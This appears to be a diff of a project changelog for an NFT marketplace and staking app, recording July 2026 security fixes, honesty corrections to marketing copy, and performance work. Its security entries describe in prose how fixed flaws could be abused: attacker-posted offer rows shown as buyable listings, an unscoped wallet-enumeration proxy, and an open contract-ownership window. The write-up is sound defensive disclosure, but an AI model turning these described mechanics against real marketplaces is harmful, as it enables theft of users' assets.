+  fee rows from `DEFAULT_FEE_CONSTITUTION`, and every Solana number — program id, Meteora
+  protocol fee, minimum locked LP — reads from `dbc.ts`, so the copy cannot drift from the
+  checker that actually runs.** Honest by construction: boosted-LP farming is "pending
+  deployment" (the V4 PositionManager is still the zero address), gauge access is "an
+  application, not a promise", tiers are structural configuration rather than endorsement, and
+  no date is named. Flags unchanged — this made the rails findable and honestly labelled, not
+  live.
+- **The List-for-sale CTA added the day before was largely inert** (`1177e52d`), because
+  `nft.owner` is null everywhere except the Floor path. It was fixed where it is *true*:
+  MyCollection's tokens come from `getNFTsForOwner(connectedWallet)`, so the wallet is the
+  owner by construction (verified that MyCollection is only ever rendered with the connected
+  wallet — third-party viewing is `OnChainProfile`, a different component). Owner and
+  `orderHash` are stamped through a stable `useCallback`, since `AnimatedCard` is memo'd,
+  **without mutating the shared `tokens` array** that the CSV export, `portfolioStats` and
+  BulkListingWizard also read; the CTA is suppressed on already-listed tokens. **Deliberately
+  not done: backfilling Gallery's owner from `listing.maker`.** It would add zero CTAs (those
+  tokens all have an `orderHash`, so the new suppression hides it) while feeding a
+  possibly-stale maker into Modal's user-visible "Owner: 0x…" line — a transferred token would
+  display the *previous* owner as current. Not worth introducing a disprovable claim for no
+  benefit.
+
+### Security — The native orderbook served attacker-postable "offer" rows as buyable listings; the bundle kill-switch failed open (2026-07-19)
+
+`4ed2c8b8`. Surfaced by a pre-go-live audit of the still-flag-gated bundle
+feature. The blocking finding was not about bundles at all — it was a live defect
+in the existing native orderbook, shipped and reachable in production. (Line
+numbers below are as of `4ed2c8b8`.)
+
+**`/api/orderbook` `action=query` never filtered `order_type`.** The column was
+written at two insert sites and read nowhere: the predicate chain behind the feed
+that powers the native listings table was `.eq("status", safeStatus)` and nothing
+else ([`frontend/api/orderbook.js`](frontend/api/orderbook.js)`:246`). Meanwhile
+the create path *deliberately* skips two guards for anything that is not a
+listing — `if (isListing)` at `:543` gates `verifyNftOwnership`, and
+`if (isListing && currencyAddr !== "0x0000…")` at `:490` gates the ETH-only
+currency check. Composed, that meant an unauthenticated caller could POST a
+validly-signed `order_type: "offer"` **whose consideration demands somebody
+else's NFT**, priced off a 1-wei ERC-20 offer item so that it sorted to the top
+of the price-ascending book — and the row rendered in the native listings table
+with a Buy button on it. A holder of that NFT clicking Buy would have been asked
+to hand over their own token for approximately nothing. Nothing in the app ever
+creates a native offer row, so every row that predicate now excludes is
+attacker-authored by construction.
+
+Blast radius was bounded, and only for the worst variant: the client passes
+`fulfillerConduitKey = bytes32(0)` into `fulfillOrder`
+([`frontend/src/nakamigos/lib/orderbook.js`](frontend/src/nakamigos/lib/orderbook.js)`:212-215`),
+so the NFT leg moves through Seaport directly and the victim needs a **direct
+Seaport 1.5 approval** — app-native sellers approve the OpenSea conduit and get a
+clean revert. A second variant needs no victim precondition at all: a native-ETH
+offer item lands a fake-priced row in the per-token gallery and floor feed,
+poisoning the floor stat, the sweep calculator and the floor-relative chips. The
+fix is one predicate at `:256`, `.eq("order_type", "listing")`, carrying a
+comment that says why removing it re-opens the hole.
+
+Three more defects closed in the same commit:
+
+- **The bundle kill-switch failed open.** The `is_bundle` filter sat *inside*
+  `if (process.env.BUNDLE_LISTING_ENABLED === "true")`, so turning the flag off
+  did not harden the feed — it deleted the filter, letting a bundle's package
+  total leak into the per-token feed and the collection floor stat, which is the
+  precise design law the filter exists to enforce. The env gate only ever existed
+  because the `is_bundle` column was absent before migration 012; that migration
+  is applied, so the filter is now unconditional and the flag gates only the
+  `bundles=true` opt-in.
+- **The stale-order pre-flight was a permanent no-op.** `fulfillNativeOrder`
+  called Seaport `getOrderStatus` with `order.order_hash` — the app's own sha256
+  row id, a value Seaport has never seen — so it returned all zeros every time:
+  `isCancelled` false, `totalFilled` 0, and the cancelled/already-filled early
+  exit **never fired, not once, for any buyer**. [`lib/trades.js`](frontend/src/nakamigos/lib/trades.js)`:498-502`
+  had already been doing it correctly against `seaport_order_hash`. The buy path
+  now reads the canonical hash and *skips* the pre-flight outright for legacy rows
+  where it is null, rather than querying with a hash that silently reports "fine".
+- **`action: "create"` accepted a multi-item offer while ownership-checking only
+  `offer[0]`.** `verifyNftOwnership` and the tokenId/contract extraction all read
+  the first element, so an N-NFT package could be stored as a one-token listing
+  with a single item verified — bypassing every create-bundle gate at once
+  (per-item ownership, dedupe, single-collection, `MAX_BUNDLE_ITEMS`, and the
+  `is_bundle`/`token_ids` bookkeeping). It now rejects `offer.length !== 1` at
+  `:371` and points the caller at create-bundle.
+
+Five regression tests landed at
+[`frontend/api/__tests__/orderbook.query-guards.test.js`](frontend/api/__tests__/orderbook.query-guards.test.js),
+pinning the predicates rather than the response: the query always emits
+`["order_type", "listing"]`, and with `BUNDLE_LISTING_ENABLED` unset it must
+still emit **both** `["is_bundle", false]` and `["order_type", "listing"]` — the
+kill-switch failing *closed* is itself an assertion. Frontend suite 1422/1422.
+
+Bundle go-live remains **NO-GO**, and not because of this commit — the bundle
+code audited clean. Its seller-management surface is incomplete: `MyListings`
+never fetches bundles, so a bundle cannot be cancelled from the canonical manage
+page. Tracked separately.
+
+### Security — An allowlist the caller could switch off by omitting its input, and listings priced in a currency the buy path cannot pay (2026-07-19)
+
+`70dfa82b` closed the last four findings of that day's review pass. The two
+security items are both surfaces that accepted input no one had validated end to
+end — one because the check ran over an empty list, one because the check that
+ran was the wrong check.
+
+- **`/api/alchemy` `getNFTsForOwner` was an unscoped wallet enumerator whenever
+  the caller simply left `contractAddresses[]` off the query.** The proxy's
+  collection scope was enforced by iterating the caller-supplied array and 403-ing
+  any entry outside `ALLOWED_CONTRACTS`
+  ([`frontend/api/alchemy.js`](frontend/api/alchemy.js)). **An empty array checks
+  nothing.** Omit the parameter and `addrs` is `[]`, the loop body never executes,
+  and the request reaches Alchemy unfiltered — every NFT any address holds,
+  answered against our paid key. This is a proxy that exists *only* to keep that
+  key scoped to three collections (Nakamigos `0xd774…c367`, GNSS Art `0xa1de…5dbb`,
+  Jungle Bay `0xd372…dda9`), and nothing else on the path substitutes for the
+  scope check: there is no authentication, the CORS handling sets an
+  `Access-Control-Allow-Origin` response header rather than refusing a
+  disallowed origin (so a non-browser caller is unaffected by it), and the
+  remaining gate is a 60-request/minute per-IP limit that bounds volume, not
+  reach — and which fails open when the Upstash rate-limit env vars are unset.
+  The fix inverts the trust: an absent `contractAddresses[]` is now
+  **populated with the allowlist** rather than validated against it, so the
+  endpoint can only ever answer "which of *our* collections does this wallet
+  hold". Guard-by-default, not guard-if-the-caller-cooperates.
+
+- **The native orderbook stored listings denominated in WETH/USDC/USDT/DAI, and
+  every consumer of those rows treats the number as ETH.** `/api/orderbook`
+  accepted any currency present in its `TOKEN_DECIMALS` table
+  ([`frontend/api/orderbook.js`](frontend/api/orderbook.js)) — five entries, four
+  of them ERC-20 — and scaled the price by that token's decimals into a
+  `price_eth` column. But the client only ever signs native-ETH consideration
+  (itemType 0, token `0x0`), `mapNativeListings`
+  ([`frontend/src/nakamigos/api.js`](frontend/src/nakamigos/api.js)) renders the
+  value as ETH **with no currency shown anywhere in the row**, and
+  `fulfillNativeOrder` sends the consideration sum as `msg.value`. So a listing
+  asking 0.5 USDC — 6 decimals in the server's own table, against ETH's 18 — is
+  stored as `price_eth = 0.5`, **displayed as 0.5 ETH, and then filled by sending
+  ERC-20 base units as wei**. The row is wrong in the shop window and wrong at the
+  till, in different directions, with no field on it that could tell either
+  surface so. Closed at both layers: the server refuses non-`0x0` consideration on
+  the single `create` listing branch and unconditionally on `create-bundle`
+  (listings-only by construction — every offer item must be an ERC721, minimum
+  two), each guard placed *before* the `TOKEN_DECIMALS` lookup that used to
+  legitimise the currency; and `mapNativeListings` drops any row whose `currency`
+  is neither absent nor the zero address, as defence-in-depth for rows that
+  predate the server guard. Dropping such a row is the correct failure — showing a
+  price in an unknown unit is worse than showing nothing.
+
+  **The first pass over-applied this and broke ERC-20 bidding.** Restricting
+  *offers* to ETH as well removes the standard way to bid on an NFT; the test
+  suite caught it. Offers stay unrestricted, and the distinction now has its own
+  regression test asserting a 400 on an ERC-20-denominated **listing**, sitting
+  directly above the pre-existing ERC-20 **offer** happy path ("price scales to
+  6 dp"), so the two halves cannot silently converge again
+  ([`frontend/api/__tests__/orderbook-r053.test.js`](frontend/api/__tests__/orderbook-r053.test.js)).
+
+Two smaller findings rode along in the same commit and are recorded here for
+completeness. `/leaderboard` lost its "Streak" and "Multiplier" tiles: `recordDailyVisit()`
+is a deprecated no-op and nothing increments `streak.current`, so `getStreakMultiplier()`
+returns 1 for everyone — **two of the four headline stats on the reputation page
+were zeros that could not move**. Points and Tier read real data and remain. And
+`_lib/launcher-outcomes.js` renamed `ETHERSCAN_USE_HEADER` → `ETHERSCAN_USE_V2`
+with its comment corrected, the flag having still described Bearer auth after that
+day's switch to querystring keys; the rename initially missed a usage, a
+`ReferenceError` that `node --check` cannot catch because it checks syntax, not
+scope. 1417/1417 green.
+
+### Security — Nine contracts had an open ownership window to a red-team-flagged Safe; closed eleven days before it expired (2026-07-18)
+
+Five commits, from discovery through turn-key runbook to executed-and-verified.
+
+- **The exposure.** The 2026-07-16 gated batch left nine contracts — Gauge, NFTLending and
+  its Admin, VoteIncentives and its Admin, CommunityGrants, LaunchpadV2, MemeBountyBoard,
+  PremiumAccess — with a live two-step ownership transfer **pending to the red-team-flagged
+  `0xA360` Safe**, open under `OwnableNoRenounce`'s 14-day expiry until 2026-07-30 ~04:39 UTC.
+  **While that window was open, a compromised quorum could call `acceptOwnership()` and seize
+  them.** Surfaced by `6029b6fd`, whose wider job was the sequenced checklist for rebuilding
+  three disjoint Safes (Treasury 3-of-5 / Admin 3-of-5 / Guardian 2-of-3) and re-homing every
+  privileged role off the hot deployer EOA and the flagged Safe — grounded in a read of
+  `contracts/broadcast/*` and `OwnableNoRenounce.sol`, with **every state claim flagged VERIFY
+  ON-CHAIN, on the stated grounds that broadcast files are deploy intent, not a live read.**
+- **The window could be closed without waiting for a rebuilt Safe** (`30187851`).
+  `cancelOwnershipTransfer(string)` is `onlyOwner` and the owner was still the *clean*
+  deployer. Verified live against mainnet at block 25564314 (2026-07-19 04:17 UTC): state read
+  per contract, **selector `0x97130667` confirmed present in the deployed bytecode** — not
+  inferred from source — and the call simulated from the deployer via `eth_call`. All nine
+  succeed; 361,696 gas total, ~0.0000176 ETH. This also resolved a stale note that said "10
+  two-step contracts": **it is nine two-step plus the constructor-owned `NFTPoolFactory`,
+  which has no window to cancel.** Nothing was signed or broadcast in that commit — operator
+  action.
+- **Executed and read back** (`bb93911e`). The operator sent `cancelOwnershipTransfer(string)`
+  on all nine from the deployer keystore, blocks 25564409–25564548, ~32k gas each, 0.0000147
+  ETH total. Verified on-chain afterwards: **`owner = 0x1489…456E` unchanged,
+  `pendingOwner = 0x0`, `ownershipTransferExpiresAt = 0` on all nine** — the seizure window
+  closed 11 days before the deadline. The runbook was marked EXECUTED so it is not re-run (it
+  now reverts `NoPendingOwnershipTransfer`). **Windows-closed is not the same as re-homed**:
+  the nine still needed moving to a clean Safe after the rebuild, and `NFTPoolFactory` remains
+  `0xA360`-owned because its ownership is constructor-direct.
+- **Two dry-run-by-default operator scripts** landed alongside, matching the `deploy-gated.sh`
+  convention. `cancel-gated-pending.sh` (`b0a58fce`) reads `owner()` / `pendingOwner()` /
+  expiry per contract and, with `--broadcast` and a `SIGNER`, clears the pending slot
+  (`OwnableNoRenounce.sol:205`); it is mainnet-guarded and skips any contract already re-homed
+  or whose pending owner is not the flagged Safe. `rehome-ownership.sh` (`f48f3c0d`) does
+  Step B: with `ADMIN_SAFE` plus `--broadcast` it calls `transferOwnership(ADMIN_SAFE)` on all
+  **18** deployer-owned two-step `OwnableNoRenounce` contracts, overwriting any stale pending
+  transfer, and performs the `TegridyFactory` feeToSetter re-home. It **refuses a non-contract
+  `ADMIN_SAFE`** — it must be a rebuilt Safe — and refuses non-mainnet.
+- **A correction to the runbook, from the audit later that day** (`11962306`): the feeToSetter
+  sequence was wrong. `cancelFeeToSetterProposal` must come **first**, because
+  `proposeFeeToSetter` reverts `CANCEL_EXISTING_FIRST` (`TegridyFactory.sol:358`); and a
+  claim that the existing proposal was "still acceptable by `0xA360`" was removed as false —
+  its 7-day validity (`:368`) had already expired.
+
+### Added — Bundle listings: N NFTs at one price, built and left switched off (2026-07-18)
+
+`7a6b484f`, `69ba2465`. Replaces a fake "Create Bundle" stub that **showed a success toast
+and listed nothing** with a real multi-item Seaport bundle-listing money path — built by
+extending the audited single-listing path verbatim rather than hand-rolling new Seaport logic.
+
+**Off by default behind two independent gates** — a client constant and the server env
+`BUNDLE_LISTING_ENABLED` — so flipping one alone cannot expose it. The stated preconditions
+for go-live were: migration 012 applied, the server env set, and the money path cleared by
+re-audit.
+
+- **Client** (`src/nakamigos/lib/orderbook.js`): `createNativeBundleListing({items, priceEth,
+  expirationHours})` builds an N-item ERC721 offer at one price split (seller + 1% fee), does
+  per-collection `setApprovalForAll`, signs EIP-712, derives the canonical `orderHash` and
+  POSTs `action=create-bundle`. Guards: ≥2 items, ≤`MAX_BUNDLE_ITEMS`, no duplicate items,
+  single collection, flag gate first. `bundleAuthItemsString()` produces a deterministic
+  sorted item digest bound into the auth message, **in lockstep with the server
+  reconstruction and unit-tested as such**.
+- **Server** (`api/orderbook.js`, `api/_lib/seaport-verify.js`): an isolated `create-bundle`
+  action reusing the same helpers — **the audited single `create` was left untouched** — plus
+  `verifyBundleOwnership` with a per-item ownership loop and error-mapping parity. Env
+  kill-switch, replay window, ERC721 / allowed-collection / duplicate / single-collection
+  checks, price sum and cap, Seaport signature verification, canonical hash re-derive, rate
+  limit. Migration 012 (`is_bundle`, `token_ids`, plus a shape CHECK) was **written, not
+  applied**.
+- **An adversarial re-audit was folded in before the commit landed** (10 reported, 6
+  confirmed). Bundles are a package object, not per-token, so they are excluded from the
+  per-token gallery *and* from the server listings/floor query — otherwise a package total
+  poisons a per-token floor. A client-side `MAX_BUNDLE_ITEMS` cap was added so a whale cannot
+  sign twice and pay approval gas for a bundle the server will reject for size. And the
+  single-collection invariant was mirrored on both sides.
+- **The display layer** (`69ba2465`) made the listings query bundle-aware — the default feed
+  excludes bundles, `?bundles=true` returns them, and it returns empty while the feature flag
+  is off since the column only exists post-migration. `fetchNativeListings` gained a `bundles`
+  option, `NativeListingsList` renders `Bundle · N NFTs (#a, #b …)` instead of a single token
+  id, and `OrderBookPanel` gained a gated BUNDLES section **reusing the exact same buy and
+  cancel handlers**, because `fulfillNativeOrder` is already multi-item safe.
+
+The honest framing shipped with it: BundleListing shows "Coming Soon" and a notice while off,
+and only produces a real signed and stored listing when enabled. The display layer could not
+be exercised against real bundle rows before the migration, and was noted as needing live QA.
+
+### Fixed — Tradermigos: a depth chart that blanked itself, three money-path pre-checks, and ~75 infinite animation loops behind every tab (2026-07-18)
+
+A dedicated review of the un-typechecked nakamigos marketplace: **14 reported, 11 confirmed
+via per-finding adversarial verification.** The seven clearly-safe, non-money-path fixes went
+first (`285cf7fb`); four money-path findings were held for explicit sign-off, and three of
+them landed separately (`8491a83a`).
+
+- **Display correctness.** `DepthChart.jsx`: the equal-price bucket omitted `lo`/`hi`, so
+  `xScale(undefined)` = NaN **blanked the whole depth chart whenever a side had one distinct
+  price** — a single offer was enough. `ComparableSales.jsx`: a slower fetch for a *previous*
+  NFT could resolve last and overwrite the current token's comparable sales, a last-write-wins
+  race plus a set-state-after-unmount, because the `nft` prop changes without a remount; a
+  cancelled-flag guard closes it.
+- **Accessibility and layout.** `ShoppingCart.jsx`'s drawer was hidden only via `translateX`
+  when closed, **leaving its Close / Remove / Sweep / Clear controls in the tab order and the
+  a11y tree** — now `inert` when closed. WalletModal and MakeOfferModal restore focus to the
+  pre-open element on close (it was falling to `<body>`), matching `Modal.jsx` /
+  `TheaterMode.jsx`. NotificationCenter's mark-as-read sat on a `div onClick` with no keyboard
+  path; unread rows got `role=button` / `tabIndex` / `onKeyDown`. MakeOfferModal gained
+  `maxHeight: 90vh` with scroll so a tall offer form does not clip its own close button off
+  short viewports.
+- **Three money-path pre-checks restored** (`8491a83a`; none of them change what a *successful*
+  transaction does, and native fulfillment was traced unaffected). `api.js`: native listings
+  stored `orderData` as the flat Seaport params while the shared validator reads
+  `orderData.parameters` — the nested OpenSea `protocol_data` shape — so **ownership, approval
+  and expiry pre-checks were silently no-opping** and native listings painted a false "order
+  data incomplete" warning. `OfferPanel.jsx`: the offer list filtered on expiry only, so an
+  owner could be shown Accept for a cancelled or finalized order, **firing `setApprovalForAll`
+  on-chain before the fulfillment fails** — the `!cancelled && !finalized` guard BidManager
+  already used was added. `MyListings.jsx`: the backend-notify `signMessage` sat outside the
+  best-effort try, so rejecting it *after* the on-chain cancel had already confirmed reported
+  "declined" and kept the dead listing on screen.
+- **A gallery buy was leaving the building** (`a937dd11`). A native, treasury-funding listing
+  opened from the **Gallery** lost its buy route: Gallery merged only `price` onto tokens, so
+  the detail modal saw no `orderHash` and fell through to a "Buy on OpenSea" redirect —
+  **sending the sale, and the 1% treasury fee, to OpenSea.** The Floor grid already carried the
+  full listing fields and fulfilled in-app, so the same enrichment was mirrored into Gallery,
+  routing only to the existing, tested `fulfillNativeOrder` / `fulfillSeaportOrder`. Native
+  listing *creation* was reachable only from the buried "My NFTs > Bulk List" path, so an
+  owner-only "List for sale on the Tegridy order book" CTA was added to the detail modal —
+  pure navigation to the tested wizard, no new money-path code. The fee is parity with OpenSea
+  at ~1%, so it is framed as treasury-funding plus 0% royalty, **not a fake discount**.
+- **Mobile and iPad lag** (`543bb010`; 12 reported, 9 confirmed). Desktop is unchanged — every
+  fix gates on `(pointer: coarse)` or `prefers-reduced-motion`. The app-wide animated
+  background ran **~75 infinite framer-motion `blur()` loops** — mesh, rays, orbs, motes and 20
+  drifting ghost-art images — behind every tab, of which only 2 layers respected
+  reduced-motion and **none** gated for mobile; the commit records this as the dominant cause
+  of continuous jank and the 20-image (~2.4 MB) decode storm as what made thumbnails slow.
+  Touch and reduced-motion now get a static gradient plus a ~7-image ghost-art spread with no
+  per-frame animation. `NftImage.jsx`'s grid `srcSet` used density descriptors (1x/2x) with no
+  `sizes`, **so retina phones fetched `imageLarge` — up to a 2000px IPFS original — into a
+  ~200px cell**; the 2x upgrade is skipped on touch and desktop retina keeps the crisp variant.
+  The My-NFTs grid mounted every owned token, up to ~100 animated cards at once, and is now
+  capped at 60 with "Show more"; the loading shimmer's `background-position` paint is disabled
+  on touch (it had been reduced-motion only) across 60+ concurrent placeholders; and
+  SplashScreen's 50-particle canvas rAF loop is skipped. **The coarse-pointer path cannot be
+  exercised on desktop — confirming the improvement needed a real phone or iPad**, and the
+  commit says so.
+
+### Changed — The app stopped overclaiming: emissions APR, Premium's vapor benefits, a one-click-disprovable security headline, and hardcoded numbers that could silently go stale (2026-07-18)
+
+Five commits, each change confirmed against `file:line` before patching. `21c95d0c` and
+`041df549` are batches 1 and 2 of a multi-agent "make it better" analysis (49 improvements)
+plus a live walkthrough; `b8330025` came from a 7-agent read-only trust pass, `fc479a7b`
+from a multi-agent frontend review, and `270a8665` from a comprehensive main-app review.
+
+- **Naming that was impersonating the thesis.** Farm and Home renamed "Base/Staking APR" to
+  **"Emissions APR"** — the four-to-five-digit number was impersonating the real-yield thesis,
+  and the sub-lines already carried the bootstrap disclaimer. "ETH Distributed: 0.0000" was
+  reframed with a forward-looking sub-line ("fee rail live · first at native-pool launch")
+  rather than left as a bare zero that reads as dead. NFT Finance dropped
+  "institutional-grade tools, all in one place" for something honest and specific, and the
+  misleading "Staking + Restake" tab subtitle became "ETH loans + restake". Stale
+  "Last reviewed: June 2026" footers on Security / Contracts / FAQ / Risks were bumped to July
+  on the reasoning that a current review date is a trust signal and a month-old one reads as
+  abandoned (legal Terms and Privacy dates left alone per convention).
+- **Premium's vapor benefits cut** (`041df549`). The contract has **no fee discount**, points
+  are on-chain-derived so there is no "3x multiplier", "priority gas" is not real, and Smart
+  Alerts plus Advanced Analytics **already ship free to every wallet**. `ACTIVE_BENEFITS` was
+  reduced to the two genuinely real mechanics: real ETH yield via staking, and JBAC lifetime
+  access.
+- **A security headline anyone could disprove in one click** (`b8330025`). "No Oracle Risk"
+  is false — the protocol runs a TWAP oracle and a Chainlink sequencer feed — so it became
+  **"On-Chain TWAP Pricing / no external price feeds like Chainlink"**, the true and checkable
+  differentiator. A leading banner was added: "No paid third-party audit yet — here is exactly
+  what we do instead", consolidating claims already true on the page. Two faint
+  `text-white/40` spans went to `white/70` **on the #1 trust page**, verified to be static
+  colour and *not* the framer `whileInView` headless artifact. And the bug-bounty tiers
+  dropped their non-credible fixed USD figures for priority and recognition descriptors, since
+  the intro already says payouts scale with the treasury.
+- **"Audited" corrected across three commits** (`b8330025`, `fc479a7b`, `95660d4c`).
+  `towelieKnowledge`'s four "built and audited" claims about our own undeployed contracts, and
+  its NFT-Lending "Audited but not redeployed" and Gold Card "Built and audited" answers,
+  became "internally reviewed (no third-party audit yet)" — **all six contradicted that same
+  file's own line 270, which says there is no paid outside audit yet.** Separately, FAQPage's
+  "audited" for lending and premium became "internally reviewed (not yet third-party
+  audited)"; LendingSection's "being audited" became "in final internal review"; and
+  LaunchPage's "audited template" became **"Doppler's audited template" — attributing the
+  audit to whoever actually did it.**
+- **Two absolute claims dropped.** "No other launcher gives a launch a day-2 economy"
+  (`fc479a7b`) and "no other launcher offers" (`95660d4c`) both became "few", matching the
+  already-softened sibling header.
+- **Treasury framing and Soon chips.** The near-zero treasury balance is now framed as
+  by-design — opex funded from ETH fees, no pre-funded war chest, **verified against
+  `docs/OPEX.md`** — so ~$0 reads as intentional. NFT-Finance's gated tabs and intro cards got
+  amber "Soon" chips driven by a `SECTION_DEPLOYED` map (all four contracts were the zero
+  address at the time), and **the chips auto-clear on deploy**.
+- **Literals replaced with the values the codebase already reads live** (`270a8665`; 9
+  findings reported, 9 confirmed). Absolute page copy on LorePage / SecurityPage /
+  ContractsPage about the whole swap-fee line reaching stakers was softened to reflect the
+  governance-adjustable on-chain split — **the split is a governance-mutable on-chain
+  parameter, and the codebase reads it live elsewhere**, so a literal silently misstates the
+  moment governance retunes it. The 25% early-withdrawal penalty in StakingCard and
+  BoostScheduleTable now derives from `EARLY_WITHDRAWAL_PENALTY_BPS`; TokenomicsPage's "1B"
+  total supply from `TOWELI_TOTAL_SUPPLY`; RisksPage's "0.5%" swap fee from `SWAP_FEE_BPS`
+  (mirroring TermsPage); and VoteIncentives' hardcoded "3%" bribe fee became "a small protocol
+  fee (shown live at deposit)".
+- **One live money-path defect rode in the same commit.** `LiquidityTab.tsx` derived the
+  LP-remove amount from a **lossy JS float of the formatted LP balance**, so a 100% withdrawal
+  could reconstruct an `lpWei` *above* the true balance — the burn reverts — and tiny balances
+  produced exponential strings `parseUnits` rejects, **leaving the position un-removable**. It
+  is now computed from the exact on-chain bigint (`liq.lpBalance * pct / 100n`) →
+  `formatUnits`, which round-trips exactly through the unchanged `parseUnits(…, 18)`
+  transaction math. 100% and dust withdrawals both work. Alongside it, `LPFarmingSection`'s
+  `'calculating&hellip;'` — an HTML entity inside a JS string, rendered literally — became
+  `'calculating…'`.
+- Accessibility: `PriceAlertWidget` gained `aria-label`s on its above/below `<select>` and its
+  price `<input>`, which had been labelled only by a placeholder or not at all — WCAG 4.1.2 /
+  3.3.2 Level A, live and unconditional on the Dashboard.
+
+### Added — The staking loop and the trade surface got their own numbers: live claimable accrual, a real-yield panel, a live-now community hub (2026-07-18)
+
+- **Claimable now moves every second, reconciled to chain** (`e562dda4`). It had only moved
+  on the 30-second refetch, so **the number looked frozen — the app reading as dead while it
+  is actually accruing every block.** It now interpolates between refetches using the
+  *contract's own arithmetic*: `rewardPerToken` grows by `rewardRate / totalBoostedStake` per
+  second, times this position's `boostedAmount` (= `amount * boostBps / 10000`,
+  `TegridyStaking.sol:2258`). `rewardRate` and `totalBoostedStake` are appended to the existing
+  `useUserPosition` batch, so they inherit its enabled-gate, chainId pin and refetch interval
+  — **no new query**. The honesty properties are the entire point:
+  - **No fabricated rate.** Paused, unread or empty position → `accrualPerSec` is 0 and the UI
+    falls back verbatim to the static on-chain value; the "est. live" chip appears only when a
+    real rate exists.
+  - **Reconcile, never drift.** The effect re-baselines on every change of the true value, so
+    a claim snaps the counter *down* immediately and each refetch overwrites the estimate with
+    chain truth. A 45-second extrapolation cap bounds worst-case error if a refetch stalls —
+    **the counter parks rather than inventing rewards.**
+  - **Transaction-safe.** Claim amounts, the claim gate, the USD sub-line and Portfolio Value
+    all stay on the settled `pendingReward` / `pendingTotal`; `pendingLive` is documented
+    DISPLAY-ONLY so it cannot leak into a transaction later.
+  - The ticker is `aria-hidden` with an sr-only live region carrying the settled value, because
+    a per-second number under `aria-live` would flood screen readers.
+- **The real-yield thesis is now visible where a staker looks** (`79b8886c`). The whole ETH
+  fee-share strategy showed no ETH figure anywhere in the Farm staking loop. `RealYieldProof`
+  gained an opt-in `showWhenEmpty` prop: it still self-gates to nothing at zero on the Home
+  hero, keeping that minimalism, but on the Farm page it renders the thesis, the mechanism and
+  a RevenueDistributor Etherscan link in a graceful "distributions begin as volume comes
+  online" state **instead of a stark zero**, and fills with the live cumulative (ETH paid,
+  epochs, % claimed) the moment the first epoch settles. The same commit updated
+  `OnboardingModal.test` to the non-blocking behaviour batch 3 had introduced — **it had been
+  asserting the old TOS-style blocking modal.**
+- **CoW promoted, the browser watcher demoted** (`1aaa2d8c`). The limit-order tab led with the
+  browser-only watcher as a large primary button and buried the real CoW Protocol order in a
+  small secondary — backwards. The CoW path is strictly better: it settles on-chain, survives
+  closing the tab, is gasless to place and MEV-protected, and its only cost is wrapping ETH to
+  WETH once. Inverted, with the watcher moved behind a disclosure ("quick browser watch —
+  native ETH, no wrap") so it stops competing with the reliable order while keeping its one
+  genuine edge. **No logic changed** — same handlers, same caps, same order lists.
+- **Community stopped opening on a wall of dead surfaces** (`65055e7c`). It opened on four
+  gated tabs — governance, bounties, vote-incentives, gauges — that all render "isn't live
+  yet". A "Live now" section under the header links the community surfaces that *are* live
+  (Tegridy Score, the Tradermigos chat, the gallery), and the on-chain tabs below are honestly
+  framed as "coming with the relaunch". **Additive; no existing sections removed.**
+- **Onboarding stopped blocking the first click** (`c3248c72`). The skip button now appears at
+  ~0.4s instead of 2s and the welcome modal is `dismissOnBackdrop=true`, so a first-timer can
+  click the hero or press Escape and start immediately instead of being forced through a
+  four-step gate — recorded as a mobile bounce fix. The "Claim & compound" CTA only ever called
+  `getReward`, so it was renamed to the honest "Claim rewards" with a note to re-stake on the
+  Farm page. Swap card input rows went from `rgba(0,0,0,0.55)` to `0.75` for readability over
+  the art, and the Solana swap gained the pay/receive flip button it was missing.
+- **Chips and an affordance activated from plumbing that already existed** (`faeec0f0`).
+  Tradermigos listing rows now show order-validity and floor-relative chips ("18% below
+  floor", "Expires in 6h"), both reading data **the row already carried**: `end_time` (NOT
+  NULL since migration 002, the same field used to drop expired rows) and the collection
+  floor, which `OrderBookPanel` already declared as a prop and `Listings.jsx` already passed
+  but nothing consumed. Null-safe — no source, no chip — **so no number is ever invented** —
+  and **bundle rows deliberately get no floor chip**, because a bundle price is a package
+  total for N NFTs and a floor-relative percentage would be meaningless. The wallet-less
+  YieldCalculator already existed and was already titled "See what you'd earn" but nothing
+  linked to it; a stable `#yield-calculator` anchor and a link from the disconnected Farm
+  branch fixed that, and that branch renders only when HomePage also renders the calculator,
+  so the deep link cannot miss. The flagged "swap card over art" contrast item was a **verified
+  false positive** — already hardened in `c3248c72`; only the SolanaSwapPage analog was left,
+  and its USD sub-labels went `white/40` → `white/55`. Three AppLoader comments still claimed
+  the Skip button appears "~2s" in; the code had used 400ms since the onboarding batch.
+
+### Performance — /nft-finance shipped 1.27 MB to every visitor, and the Irys SDK rode in on a pure helper (2026-07-18)
+
+`ad81e6f6`, `95660d4c`.
+
+- **The page shipped as one 1,273 kB chunk**, so every visitor paid for all four tab sections
+  up front while only one section mounts at a time. LendingPage's tab sections became
+  `React.lazy` behind a `Suspense(PageSkeleton)` boundary (named exports remapped to default):
+  - LendingPage shell: **1,273 kB → 11.5 kB**
+  - default Token Lending: 45.8 kB, loading with the shell
+  - NFT Lending / AMM / Launchpad: 28.9 / 65.6 / 99.2 kB, on first tab-switch
+  - **Initial `/nft-finance` payload ~1,273 kB → ~57 kB, about 95% less.**
+- **The Irys SDK was in the bundle because of a pure helper.** `@irys/web-upload{,-ethereum}`
+  bundles ethers, arbundles and a crypto stack (~1.1 MB) and was pulled into the launchpad
+  chunk **merely because the wizard imports the pure `arweaveUri()` helper from the same
+  module**. Dynamic-imported inside `build()`, it now loads only when a user actually uploads,
+  dropping LaunchpadSection **1,124 kB → 99 kB**. Pure helpers stay weightless.
+- **The same lazy-split pattern on the Doppler SDK** (`95660d4c`): `DopplerSDK` is dynamically
+  imported inside `launchToken()`, splitting the ~589 kB `/evm` SDK into its own lazy chunk and
+  dropping the LaunchPage chunk to **~43 kB** — it loads only when a launch actually fires.
+- **Dead-dep prune, with one correction on the record.** `recharts` and `react-is` were
+  removed from `package.json` along with the now-dead `vendor-recharts` `manualChunks` rule:
+  recharts had been replaced by a CSS donut in TokenomicsPage and `react-is@19` was its only
+  runtime consumer, both verified as having zero `src` imports. **The original audit finding
+  also said `ethers` was dead. It is not** — it is dynamically imported throughout
+  `src/nakamigos` for Seaport signing — and the commit records verifying that before acting
+  rather than removing it.
+- Three correctness fixes rode along in `95660d4c`, each verified against `file:line` before
+  patching. `App.tsx`: `RouteErrorBoundary` now resets on route change (`resetKey=pathname`
+  plus `componentDidUpdate`), **so a crash on one page no longer strands the whole SPA**.
+  `eip5792.ts` gained `callsId()`, because EIP-5792 v2.0.0 `sendCalls` resolves to `{id}`
